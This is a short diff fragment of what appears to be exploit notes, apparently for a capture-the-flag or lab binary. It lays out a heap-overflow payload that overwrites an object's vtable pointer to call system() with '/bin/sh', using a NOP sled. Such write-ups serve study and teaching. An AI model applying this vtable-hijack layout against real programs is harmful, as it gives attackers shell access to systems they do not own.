@@ -164,6 +164,7 @@ Written to 0x804a080 (vtable pointer of this_00).
 8 bytes: semicolon (ignored) + "/bin/sh" + null terminator.
 Written to 0x804a084 onward.
 
+0x804a008: base          # this
 0x804a00c: 0xb7d86060    # system() address (4 bytes)  ← START OF COPY (this+4)
 0x804a010: \x90\x90...   # 112 NOPs, occupies 0x804a010 .. 0x804a07f
 0x804a080: 0x0804a00c    # this_00->vtable ← overwritten here (4 bytes)
